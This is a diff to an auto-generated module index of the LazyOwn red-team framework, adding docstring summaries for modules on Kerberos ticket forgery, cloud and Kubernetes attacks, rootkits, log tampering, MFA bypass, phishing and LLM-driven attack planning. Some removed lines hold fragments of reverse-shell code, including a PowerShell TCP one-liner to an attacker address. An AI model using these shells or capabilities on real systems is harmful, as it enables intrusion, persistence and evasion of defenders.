   - `CrackResult` (class, line 131) `class CrackResult`
@@ -1851,6 +1872,7 @@
 
 ## modules/hive_invoke.py
 - Layer: utility
+- Doc: modules/hive_invoke.py ======================= Invokes Claude Code CLI with the LazyOwn MCP server and forwards an opera
 - Language: py
 - Symbols:
   - `_get_toposwarm` (function, line 49) `def _get_toposwarm()`
@@ -1885,6 +1907,7 @@
 
 ## modules/ia_logs_analysis.py
 - Layer: utility
+- Doc: log_monitor_bot.py  Author: Your Name Email: youremail@example.com Creation Date: 10/06/2024 License: GPL v3  Descriptio
 - Language: py
 - Symbols:
   - `LogFileHandler` (class, line 53) `class LogFileHandler(FileSystemEventHandler)`
@@ -1898,6 +1921,7 @@
 
 ## modules/ia_network_analysis.py
 - Layer: utility
+- Doc: ia_network_analysis.py  Autor: grisun0 Fecha de creación: 30/01/2025 Licencia: GPL v3  Descripción: Bot de monitoreo de 
 - Language: py
 - Symbols:
   - `analyze_with_deepseek` (function, line 39) `def analyze_with_deepseek(packet_info, mode)`
@@ -1943,6 +1967,7 @@
 
 ## modules/intelligence_engine.py
 - Layer: utility
+- Doc: IntelligenceEngine — unified collection→analysis→intelligence pipeline.  Transforms raw data from nmap, tool output, ESt
 - Language: py
 - Symbols:
   - `IntelligenceConfig` (class, line 57) `class IntelligenceConfig`
@@ -1992,6 +2017,7 @@
 
 ## modules/k8s_attacks.py
 - Layer: utility
+- Doc: Kubernetes attack module — RBAC enumeration, pod escape, etcd access, Helm abuse.  Provides attack primitives for Kubern
 - Language: py
 - Symbols:
   - `K8sConfig` (class, line 57) `class K8sConfig`
@@ -2009,6 +2035,7 @@
 
 ## modules/kerberoasting.py
 - Layer: utility
+- Doc: Advanced Kerberoasting — targeted SPN enumeration, AES-only attacks, hashcat integration.  Provides enhanced Kerberoasti
 - Language: py
 - Symbols:
   - `KerberoastTarget` (class, line 38) `class KerberoastTarget`
@@ -2034,6 +2061,7 @@
 
 ## modules/kerberos_core.py
 - Layer: utility
+- Doc: Native Kerberos protocol library — AS-REQ, TGS-REQ, ticket parsing, encryption.  Provides a pure-Python Kerberos impleme
 - Language: py
 - Symbols:
   - `KerberosPrincipal` (class, line 137) `class KerberosPrincipal`
@@ -2075,6 +2103,7 @@
 
 ## modules/kerberos_tickets.py
 - Layer: utility
+- Doc: Kerberos ticket forgery attacks — silver, golden, diamond, sapphire tickets.  Implements ticket forging techniques for p
 - Language: py
 - Symbols:
   - `SilverTicketConfig` (class, line 36) `class SilverTicketConfig`
@@ -2116,6 +2145,7 @@
 
 ## modules/kill_chain_viz.py
 - Layer: utility
+- Doc: SVG / HTML kill-chain visualizer — generates standalone HTML with embedded SVG.  Reads ``modules.killchain.KillChain`` a
 - Language: py
 - Symbols:
   - `_load_phases` (function, line 21) `def _load_phases(sessions)`
@@ -2128,6 +2158,7 @@
 
 ## modules/killchain.py
 - Layer: utility
+- Doc: Unified kill-chain — single source of truth consumed by all surfaces.  This module is the canonical authority for kill-c
 - Language: py
 - Symbols:
   - `KillChainConfig` (class, line 39) `class KillChainConfig`
@@ -2164,6 +2195,7 @@
 
 ## modules/lazy_rbac.py
 - Layer: presentation
+- Doc: modules/lazy_rbac.py ==================== Role-Based Access Control, Multi-Factor Authentication, and Multi-Tenancy for 
 - Language: py
 - Symbols:
   - `Role` (class, line 55) `class Role(Enum)`
@@ -2303,6 +2335,7 @@
 
 ## modules/lazycloud.py
 - Layer: utility
+- Doc: Cloud-native attack module for AWS, Azure, and GCP.  Provides enumeration, misconfiguration detection, credential harves
 - Language: py
 - Symbols:
   - `CloudResource` (class, line 59) `class CloudResource`
@@ -2371,6 +2404,7 @@
 
 ## modules/lazyk8s.py
 - Layer: utility
+- Doc: Container and Kubernetes attack module.  Provides enumeration, exploitation, privilege escalation, and escape techniques
 - Language: py
 - Symbols:
   - `ContainerResource` (class, line 20) `class ContainerResource`
@@ -2444,6 +2478,7 @@
 
 ## modules/lazyown_bprfuzzer.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `_load_security_config` (function, line 44) `def _load_security_config()`
@@ -2465,6 +2500,7 @@
 
 ## modules/lazyown_bridge.py
 - Layer: utility
+- Doc: modules/lazyown_bridge.py ========================== Full-coverage structured catalog of all LazyOwn do_ commands mapped
 - Language: py
 - Symbols:
   - `CatalogEntry` (class, line 46) `class CatalogEntry`
@@ -2515,6 +2551,7 @@
 
 ## modules/lazyown_metaextract0r.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `signal_handler` (function, line 40) `def signal_handler(sig, frame)`
@@ -2529,6 +2566,7 @@
 
 ## modules/lazyown_parquet_tool.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `highlight_term` (function, line 32) `def highlight_term(text, term)`
@@ -2538,6 +2576,7 @@
 
 ## modules/lazyownclient.py
 - Layer: infrastructure
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `signal_handler` (function, line 33) `def signal_handler(sig, frame)`
@@ -2558,6 +2597,7 @@
 
 ## modules/lazyownserver.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Symbols:
   - `signal_handler` (function, line 33) `def signal_handler(sig, frame)`
@@ -2606,6 +2646,7 @@
 
 ## modules/lesson_ingestor.py
 - Layer: utility
+- Doc: Lesson ingestion bridge between EpisodeReflectionEngine and MoERouter.  After a campaign completes, :class:`EpisodeRefle
 - Language: py
 - Symbols:
   - `LessonLearned` (class, line 54) `class LessonLearned`
@@ -2624,6 +2665,7 @@
 
 ## modules/lilsplunky.py
 - Layer: utility
+- Doc: log_monitor_bot_v2_monolithic.py  Author: Your Name Email: youremail@example.com Creation Date: 14/04/2025 License: GPL 
 - Language: py
 - Symbols:
   - `simple_parse_log_line` (function, line 68) `def simple_parse_log_line(line, file_path)`
@@ -2644,6 +2686,7 @@
 
 ## modules/linux_advanced_payloads.py
 - Layer: utility
+- Doc: Advanced Linux payloads — LD_PRELOAD rootkits, eBPF, PAM backdoors, kernel implants.  Generates Linux-native payloads fo
 - Language: py
 - Symbols:
   - `LinuxAdvancedConfig` (class, line 64) `class LinuxAdvancedConfig`
@@ -2667,6 +2710,7 @@
 
 ## modules/listener_manager.py
 - Layer: utility
+- Doc: Multi-listener manager for LazyOwn C2.  Allows the C2 to listen on multiple ports simultaneously, each serving the same 
 - Language: py
 - Symbols:
   - `_collect_listener_bind_candidates` (function, line 35) `def _collect_listener_bind_candidates(payload)`
@@ -2696,6 +2740,7 @@
 
 ## modules/live_surface.py
 - Layer: utility
+- Doc: Live attack-surface graph derived from the world model.  The static ``templates/graph.html`` is a one-off pyvis export w
 - Language: py
 - Symbols:
   - `_is_compromised` (function, line 45) `def _is_compromised(state)`
@@ -2710,6 +2755,7 @@
 
 ## modules/llm_adapter.py
 - Layer: infrastructure
+- Doc: LLM adapter facade — single import point for all LLM backends used by lazyc2.  Consolidates the scattered LLM module imp
 - Language: py
 - Symbols:
   - `safe_groq_client` (function, line 48) `def safe_groq_client(api_key)`
@@ -2732,6 +2778,7 @@
 
 ## modules/llm_client.py
 - Layer: infrastructure
+- Doc: LazyOwn Unified LLM Client ============================ Single interface for all LLM providers used in LazyOwn: - Groq (
 - Language: py
 - Symbols:
   - `LLMClient` (class, line 45) `class LLMClient`
@@ -2750,6 +2797,7 @@
 
 ## modules/llm_evaluator.py
 - Layer: utility
+- Doc: llm_evaluator.py — Records LLM decisions and their outcomes, computes quality metrics, and exports fine-tuning datasets 
 - Language: py
 - Symbols:
   - `DecisionRecord` (class, line 21) `class DecisionRecord`
@@ -2784,6 +2832,7 @@
 
 ## modules/llm_factory.py
 - Layer: infrastructure
+- Doc: LLM backend factory and selection utilities.  This module centralizes language model instantiation so that every caller 
 - Language: py
 - Symbols:
   - `LLMBackendUnavailableError` (class, line 115) `class LLMBackendUnavailableError(RuntimeError)`
@@ -2812,6 +2861,7 @@
 
 ## modules/llm_prompts.py
 - Layer: utility
+- Doc: Canonical prompt-template and knowledge-base contract for LLM consumers.  Owns every task-domain prompt template used by
 - Language: py
 - Symbols:
   - `default_project_root` (function, line 67) `def default_project_root()`
@@ -2847,6 +2897,7 @@
 
 ## modules/log_tamper.py
 - Layer: utility
+- Doc: Log tampering — Windows Event Log, Linux journald/auditd, macOS unified log.  Provides cross-platform log management for
 - Language: py
 - Symbols:
   - `LogTamperConfig` (class, line 71) `class LogTamperConfig`
@@ -2862,6 +2913,7 @@
 
 ## modules/logging_config.py
 - Layer: infrastructure
+- Doc: Centralized logging configuration for the LazyOwn framework.  Provides a single point of logging configuration to replac
 - Language: py
 - Symbols:
   - `ColoredFormatter` (class, line 36) `class ColoredFormatter(Formatter)`
@@ -2890,6 +2942,7 @@
 
 ## modules/macos_payloads.py
 - Layer: utility
+- Doc: macOS payload generation — .app bundles, persistence, TCC bypass, Swift/ObjC.  Generates macOS-native payloads: .app bun
 - Language: py
 - Symbols:
   - `MacOSPayloadConfig` (class, line 60) `class MacOSPayloadConfig`
@@ -2918,6 +2971,7 @@
 
 ## modules/mcp_agent_bridge.py
 - Layer: utility
+- Doc: LazyOwn MCP Agent Bridge ======================== Allows Claude (via MCP) to delegate tasks to internal AI agents (Groq 
 - Language: py
 - Symbols:
   - `_make_client` (function, line 38) `def _make_client(backend)`
@@ -2946,6 +3000,7 @@
 
 ## modules/memory_cleaner.py
 - Layer: utility
+- Doc: Memory artifact cleanup — process memory wipe, environment variable scrub, clipboard clear.  Provides memory-level artif
 - Language: py
 - Symbols:
   - `MemoryCleanerConfig` (class, line 22) `class MemoryCleanerConfig`
@@ -2959,6 +3014,7 @@
 
 ## modules/memory_store.py
 - Layer: data_access
+- Doc: memory_store.py — Episodic memory for the LazyOwn auto_loop.  Stores (command, output, findings, host, tool, success) pe
 - Language: py
 - Symbols:
   - `MemoryEntry` (class, line 80) `class MemoryEntry`
@@ -2998,6 +3054,7 @@
 
 ## modules/metrics.py
 - Layer: utility
+- Doc: LazyOwn metrics surface.  Two complementary subsystems live here:  * :class:`MetricsRegistry` (with the :data:`REGISTRY`
 - Language: py
 - Symbols:
   - `MetricsRegistry` (class, line 56) `class MetricsRegistry`
@@ -3029,6 +3086,7 @@
 
 ## modules/mfa_bypass.py
 - Layer: utility
+- Doc: MFA Bypass Toolkit — techniques for circumventing multi-factor authentication.  Provides automated and manual techniques
 - Language: py
 - Symbols:
   - `MFATarget` (class, line 103) `class MFATarget`
@@ -3050,6 +3108,7 @@
 
 ## modules/module_registry.py
 - Layer: utility
+- Doc: Unified module registry for LazyOwn — catalog, search, use/run workflow.  Scans ``lazyaddons/`` (YAML), ``plugins/`` (Lu
 - Language: py
 - Symbols:
   - `_classify` (function, line 47) `def _classify(category)`
@@ -3086,6 +3145,7 @@
 
 ## modules/moe_router.py
 - Layer: presentation
+- Doc: modules/moe_router.py ====================== Mixture-of-Experts (MoE) Router for LazyOwn.  Routes penetration-testing ta
 - Language: py
 - Symbols:
   - `ExpertProfile` (class, line 82) `class ExpertProfile`
@@ -3132,6 +3192,7 @@
 
 ## modules/morse.py
 - Layer: utility
+- Doc: Morse code conversion service with interactive driver.  Contract: Single self-contained module providing text to Morse c
 - Language: py
 - Symbols:
   - `MorseConfig` (class, line 16) `class MorseConfig`
@@ -3148,22 +3209,14 @@
 - Symbols:
   - `reverse_shell` (function, line 74) `void reverse_shell(void)`
   - `execvp` (function, line 128) `int execvp(const char* filename, char* const argv[])`
-  - `ssize_t` (function, line 69) `typedef ssize_t (*execvp_func_t)(const char *__file, char *const __argv[]);`
-  - `connect` (function, line 85) `connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));`
-  - `execle` (function, line 88) `execle( "/bin/bash", "/bin/bash", "-i", NULL, env_list );`
-  - `exit` (function, line 89) `exit(0);`
-  - `fgets` (function, line 114) `fgets(buffer, sizeof(buffer), conf);`
-  - `fclose` (function, line 121) `fclose(conf);`
-  - `close` (function, line 135) `close(fd);`
-  - `config_cleanup` (function, line 145) `config_cleanup();`
-  - `old_execvp` (function, line 146) `return old_execvp(filename, argv);`
-  - `_GNU_SOURCE` (macro, line 49) `#define _GNU_SOURCE`
-  - `ATTACKERS_IP` (macro, line 63) `#define ATTACKERS_IP`
+  - `_GNU_SOURCE` (macro, line 50) `#define _GNU_SOURCE`
+  - `ATTACKERS_IP` (macro, line 64) `#define ATTACKERS_IP`
   - `SHELL_PORT` (macro, line 65) `#define SHELL_PORT`
   - `INJECTED_CONF` (macro, line 66) `#define INJECTED_CONF`
 
 ## modules/network_opsec.py
 - Layer: utility
+- Doc: Network OPSEC — proxy chain enforcement, canary detection, traffic randomization.  Provides network-level operational se
 - Language: py
 - Symbols:
   - `NetworkOpsecConfig` (class, line 23) `class NetworkOpsecConfig`
@@ -3232,6 +3285,7 @@
 
 ## modules/obs_parser.py
 - Layer: utility
+- Doc: modules/obs_parser.py ====================== Observation parser: extracts structured findings from raw tool output.  Con
 - Language: py
 - Symbols:
   - `FindingType` (class, line 48) `class FindingType(StrEnum)`
@@ -3284,6 +3338,7 @@
 
 ## modules/operation.py
 - Layer: utility
+- Doc: Caldera-style operation lifecycle: create, start, pause, resume, stop, status.  Operations are persistent, time-bounded 
 - Language: py
 - Symbols:
   - `OperationStatus` (class, line 42) `class OperationStatus(StrEnum)`
@@ -3314,6 +3369,7 @@
 
 ## modules/operator_profiles.py
 - Layer: utility
+- Doc: Multi-operator profile management for LazyOwn team server.  Each operator gets an isolated profile directory with its ow
 - Language: py
 - Symbols:
   - `OperatorProfile` (class, line 38) `class OperatorProfile`
@@ -3341,6 +3397,7 @@
 
 ## modules/opsec_scorer.py
 - Layer: utility
+- Doc: OPSEC scoring engine — pre-execution noise assessment and gated scoring.  Single contract module for every OPSEC evaluat
 - Language: py
 - Symbols:
   - `RiskLevel` (class, line 162) `class RiskLevel(IntEnum)`
@@ -3384,6 +3441,7 @@
 
 ## modules/payload_factory.py
 - Layer: infrastructure
+- Doc: Native payload generation framework — stagers, stages, singles, formats.  Provides a ``PayloadFactory`` that can generat
 - Language: py
 - Symbols:
   - `_build_linux_x64_reverse_tcp` (function, line 118) `def _build_linux_x64_reverse_tcp(lhost, lport)`
@@ -3422,6 +3480,7 @@
 
 ## modules/phishing_orchestrator.py
 - Layer: utility
+- Doc: Smart Phishing Campaign Orchestrator.  Provides a ``PhishingOrchestrator`` that automates the full phishing lifecycle: t
 - Language: py
 - Symbols:
   - `_derive_credential_key` (function, line 57) `def _derive_credential_key()`
@@ -3452,6 +3511,7 @@
 
 ## modules/pipeline_engine.py
 - Layer: utility
+- Doc: modules/pipeline_engine.py — Declarative YAML pipelines for LazyOwn ====================================================
 - Language: py
 - Symbols:
   - `PipelineError` (class, line 87) `class PipelineError(Exception)`
@@ -3539,6 +3599,7 @@
 
 ## modules/planner.py
 - Layer: utility
+- Doc: Fact-based planner — decides the next ability to run.  The planner queries :class:`modules.world_model.WorldModel` for t
 - Language: py
 - Symbols:
   - `PlanCandidate` (class, line 41) `class PlanCandidate`
@@ -3560,6 +3621,7 @@
 
 ## modules/playbook_engine.py
 - Layer: utility
+- Doc: modules/playbook_engine.py =========================== Bridges MITRE ATT&CK (STIX2), Atomic Red Team, WorldModel, and LL
 - Language: py
 - Symbols:
   - `PlaybookStep` (class, line 96) `class PlaybookStep`
@@ -3598,6 +3660,7 @@
 
 ## modules/playbook_executor.py
 - Layer: utility
+- Doc: Playbook Executor — bridges MITRE ATT&CK playbooks to the pipeline engine.  Reads YAML playbooks from ``playbooks/``, ma
 - Language: py
 - Symbols:
   - `PlaybookTechnique` (class, line 36) `class PlaybookTechnique`
@@ -3629,6 +3692,7 @@
 
 ## modules/polymorphic_engine.py
 - Layer: utility
+- Doc: Polymorphic code generation engine — shellcode mutation and obfuscation.  Transforms shellcode through multiple mutation
 - Language: py
 - Symbols:
   - `MutationConfig` (class, line 93) `class MutationConfig`
@@ -3654,6 +3718,7 @@
 
 ## modules/privesc_predictor.py
 - Layer: infrastructure
+- Doc: Crystal Ball — privilege escalation vector prediction engine.  Parses system enumeration output (linpeas, winpeas, pspy)
 - Language: py
 - Symbols:
   - `PrivescVector` (class, line 97) `class PrivescVector`
@@ -3678,6 +3743,7 @@
 
 ## modules/professional_report.py
 - Layer: utility
+- Doc: Professional Red Team Report Generator.  Produces client-ready pentest/red-team reports in HTML, PDF, and Markdown forma
 - Language: py
 - Symbols:
   - `ReportFinding` (class, line 87) `class ReportFinding`
@@ -3708,6 +3774,7 @@
 
 ## modules/reactive_engine.py
 - Layer: utility
+- Doc: modules/reactive_engine.py =========================== Parses command output and produces concrete next-action recommend
 - Language: py
 - Symbols:
   - `_default_config_loader` (function, line 43) `def _default_config_loader()`
@@ -3757,6 +3824,7 @@
 
 ## modules/recommender.py
 - Layer: utility
+- Doc: LazyOwn Smart Command Recommender =================================== Reads the current session state and asks Groq to r
 - Language: py
 - Symbols:
   - `_build_user_prompt` (function, line 54) `def _build_user_prompt(state)`
@@ -3768,6 +3836,7 @@
 
 ## modules/redteam_gym.py
 - Layer: utility
+- Doc: Red Team Gym — gamified pentest training mode.  Integrates with the existing ELO/karma system in :mod:`cli.engagement_ho
 - Language: py
 - Symbols:
   - `GymAttempt` (class, line 214) `class GymAttempt`
@@ -3793,6 +3862,7 @@
 
 ## modules/reflective_dll.py
 - Layer: utility
+- Doc: Reflective DLL loading — load PE from memory without touching disk.  Implements manual PE parsing, import resolution, re
 - Language: py
 - Symbols:
   - `PEHeader` (class, line 37) `class PEHeader`
@@ -3825,6 +3895,7 @@
 
 ## modules/resource_script.py
 - Layer: utility
+- Doc: Enhanced resource script engine — variables, conditionals, loops, macros.  Extends LazyOwn's existing ``.ls`` script for
 - Language: py
 - Symbols:
   - `ScriptError` (class, line 76) `class ScriptError(RuntimeError)`
@@ -3853,27 +3924,21 @@
 
 ## modules/reverse-shell.c
 - Layer: utility
-- Doc: include <linux/kmod.h> include <linux/module.h>
 - Language: c
 - Symbols:
   - `reverse_shell_init` (function, line 12) `static int __init reverse_shell_init(void)`
-  - `reverse_shell_exit` (function, line 15) `static void __exit reverse_shell_exit(void)`
-  - `call_usermodehelper` (function, line 13) `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
-  - `printk` (function, line 17) `printk(KERN_INFO "Exiting\n");`
-  - `module_init` (function, line 19) `module_init(reverse_shell_init);`
+  - `reverse_shell_exit` (function, line 16) `static void __exit reverse_shell_exit(void)`
 
 ## modules/revshell.c
 - Layer: utility
-- Doc: include <windows.h>
 - Language: c
 - Symbols:
-  - `xlAutoOpen` (function, line 4) `void __cdecl xlAutoOpen()`
-  - `DllMain` (function, line 9) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
-  - `__declspec` (function, line 2) `__declspec(dllexport) void __cdecl xlAutoOpen(void);`
-  - `WinExec` (function, line 7) `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 443);`
+  - `xlAutoOpen` (function, line 5) `void __cdecl xlAutoOpen()`
+  - `DllMain` (function, line 10) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
 
 ## modules/rich_tui.py
 - Layer: presentation
+- Doc: Rich-based live TUI dashboard for LazyOwn campaign monitoring.  Provides an htop-style real-time dashboard that consumes
 - Language: py
 - Symbols:
   - `RichDashboard` (class, line 66) `class RichDashboard`
@@ -3895,6 +3960,7 @@
 
 ## modules/rl_trainer.py
 - Layer: utility
+- Doc: modules/rl_trainer.py ====================== Reinforcement Learning trainer for expert routing in LazyOwn's MoE system. 
 - Language: py
 - Symbols:
   - `RLConfig` (class, line 83) `class RLConfig`
@@ -3933,6 +3999,7 @@
 
 ## modules/saas_attacks.py
 - Layer: utility
+- Doc: SaaS attacks — Microsoft 365, Google Workspace, Salesforce, ServiceNow exploitation.  Provides attack primitives against
 - Language: py
 - Symbols:
   - `SaaSConfig` (class, line 48) `class SaaSConfig`
@@ -3954,11 +4021,13 @@
 
 ## modules/search.py
 - Layer: utility
+- Doc: main.py  Autor: Gris Iscomeback Correo electrónico: grisiscomeback[at]gmail[dot]com Fecha de creación: 09/06/2024 Licenc
 - Language: py
 - Imported by: `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`, `static/js/showdown-2.1.0.min.js`
 
 ## modules/security_sanitizers.py
 - Layer: utility
+- Doc: Security sanitizers shared across the LazyOwn framework.  This module centralises the defensive code paths the framework
 - Language: py
 - Symbols:
   - `SecurityConfig` (class, line 37) `class SecurityConfig`
@@ -3990,6 +4059,7 @@
 
 ## modules/session_rag.py
 - Layer: utility
+- Doc: session_rag.py — ChromaDB-backed RAG over sessions/ artefacts.  Incrementally indexes every text artefact in sessions/: 
 - Language: py
 - Symbols:
   - `_chunk_text` (function, line 81) `def _chunk_text(text, size, overlap)`
@@ -4021,6 +4091,7 @@
 
 ## modules/session_reader.py
 - Layer: utility
+- Doc: modules/session_reader.py ========================== Reads LazyOwn C2 session artefacts: - sessions/{client_id}.log  (im
 - Language: py
 - Symbols:
   - `ImplantRecord` (class, line 37) `class ImplantRecord`
@@ -4056,6 +4127,7 @@
 
 ## modules/session_state.py
 - Layer: utility
+- Doc: LazyOwn Session State ===================== Aggregates live session data from multiple sources into a single sessions/se
 - Language: py
 - Symbols:
   - `_detect_phase` (function, line 49) `def _detect_phase(event_types)`
@@ -4071,6 +4143,7 @@
 
 ## modules/sleep_obfuscation.py
 - Layer: utility
+- Doc: Sleep obfuscation engine for beacon memory evasion.  Defines a catalog of sleep obfuscation techniques with configurable
 - Language: py
 - Symbols:
   - `OsPlatform` (class, line 57) `class OsPlatform(str, Enum)`
@@ -4111,6 +4184,7 @@
 
 ## modules/socks_proxy.py
 - Layer: utility
+- Doc: SOCKS5 proxy engine for tunneling traffic through LazyOwn beacons.  Provides a configuration-driven SOCKS5 proxy that al
 - Language: py
 - Symbols:
   - `SocksAuthMethod` (class, line 65) `class SocksAuthMethod(IntEnum)`
@@ -4149,6 +4223,7 @@
 
 ## modules/staged_delivery.py
 - Layer: utility
+- Doc: Staged payload delivery — HTA, Office macros, LNK files, ISO/VHD packaging.  Generates droppers and delivery mechanisms 
 - Language: py
 - Symbols:
   - `StageDeliveryConfig` (class, line 25) `class StageDeliveryConfig`
@@ -4173,6 +4248,7 @@
 
 ## modules/state_manager.py
 - Layer: utility
+- Doc: UnifiedStateManager — single source of truth for all LazyOwn campaign state.  Replaces the fragmented state systems (Laz
 - Language: py
 - Symbols:
   - `_load_json` (function, line 43) `def _load_json(path)`
@@ -4253,6 +4329,7 @@
 
 ## modules/threat_model.py
 - Layer: business_logic
+- Doc: threat_model.py — Blue team threat model builder for LazyOwn.  Reads LazyOwn_session_report.csv + sessions/ artefacts, m
 - Language: py
 - Symbols:
   - `_extract_iocs` (function, line 245) `def _extract_iocs(text, first_seen)`
@@ -4276,6 +4353,7 @@
 
 ## modules/timeline_narrator.py
 - Layer: utility
+- Doc: LazyOwn Timeline Narrator ========================== Reads events.jsonl, groups them into time windows, and asks Groq to
 - Language: py
 - Symbols:
   - `_load_events` (function, line 56) `def _load_events(n)`
@@ -4289,6 +4367,7 @@
 
 ## modules/timestomper.py
 - Layer: utility
+- Doc: Filesystem timestomping — MACB timestamp manipulation for stealth.  Modifies file MACB (Modified, Accessed, Created, Bir
 - Language: py
 - Symbols:
   - `TimestompConfig` (class, line 24) `class TimestompConfig`
@@ -4318,6 +4397,7 @@
 
 ## modules/toposwarm_bridge.py
 - Layer: utility
+- Doc: modules/toposwarm_bridge.py ============================ Local brain bridge: connects LazyOwn to the TopoSwarm router wh
 - Language: py
 - Symbols:
   - `RoutedCall` (class, line 68) `class RoutedCall`
@@ -4347,6 +4427,7 @@
 
 ## modules/traffic_morpher.py
 - Layer: utility
+- Doc: C2 traffic obfuscation: domain fronting, protocol mimicking, and traffic shaping.  Provides multiple strategies for disg
 - Language: py
 - Symbols:
   - `TrafficMorpher` (class, line 18) `class TrafficMorpher`
@@ -4364,6 +4445,7 @@
 
 ## modules/ttp_coverage.py
 - Layer: utility
+- Doc: TTP coverage matrix — real-time MITRE ATT&CK technique tracking.  Aggregates executed techniques from all operations, pl
 - Language: py
 - Symbols:
   - `TTPRow` (class, line 55) `class TTPRow`
@@ -4384,6 +4466,7 @@
 
 ## modules/unified_bridge.py
 - Layer: utility
+- Doc: UnifiedBridge — single API over all LazyOwn bridges and routing engines.  Merges three previously isolated bridges into 
 - Language: py
 - Symbols:
   - `RouteResult` (class, line 39) `class RouteResult`
@@ -4418,6 +4501,7 @@
 
 ## modules/unified_dashboard.py
 - Layer: utility
+- Doc: Unified campaign dashboard — combines all state sources into one view.  The existing :class:`modules.dashboard_engine.Da
 - Language: py
 - Symbols:
   - `UnifiedDashboard` (class, line 36) `class UnifiedDashboard`
@@ -4553,6 +4637,7 @@
 
 ## modules/websocket_beacon.py
 - Layer: utility
+- Doc: WebSocket beacon transport for modern C2 channels.  Provides WebSocket-based beacon implementation and server-side handl
 - Language: py
 - Symbols:
   - `WebSocketBeacon` (class, line 46) `class WebSocketBeacon`
@@ -4584,6 +4669,7 @@
 
 ## modules/world_model.py
 - Layer: business_logic
+- Doc: modules/world_model.py ======================= Unified engagement world model for LazyOwn autonomous operations.  Tracks
 - Language: py
 - Symbols:
   - `_derive_crypto_key` (function, line 58) `def _derive_crypto_key(password, salt)`
@@ -4667,6 +4753,7 @@
 
 ## modules/yara_scanner.py
 - Layer: utility
+- Doc: YARA integration for malware classification and IOC scanning.  Provides file scanning, process memory scanning, and rule
 - Language: py
 - Symbols:
   - `YaraScanner` (class, line 22) `class YaraScanner`
